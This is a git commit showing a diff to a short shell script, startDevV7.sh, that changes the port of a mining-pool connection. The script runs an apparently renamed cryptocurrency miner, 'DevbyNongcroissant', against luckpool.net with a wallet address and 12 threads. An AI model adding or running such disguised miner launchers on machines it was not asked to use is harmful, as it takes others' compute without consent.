9d19bb3ae3a5da16485c30cb324dd558f68db6d1
closemaptoya <85560638+closemaptoya@users.noreply.github.com>
2021-07-10 16:28:31 +0700

    Update startDevV7.sh

--- startDevV7.sh
+++ startDevV7.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-chmod +x DevbyNongcroissant && ./DevbyNongcroissant -v -l na.luckpool.net:3956 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevbyNongcroissantV7 -p hybrid -t 12
+chmod +x DevbyNongcroissant && ./DevbyNongcroissant -v -l na.luckpool.net:3960 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevbyNongcroissantV7 -p hybrid -t 12
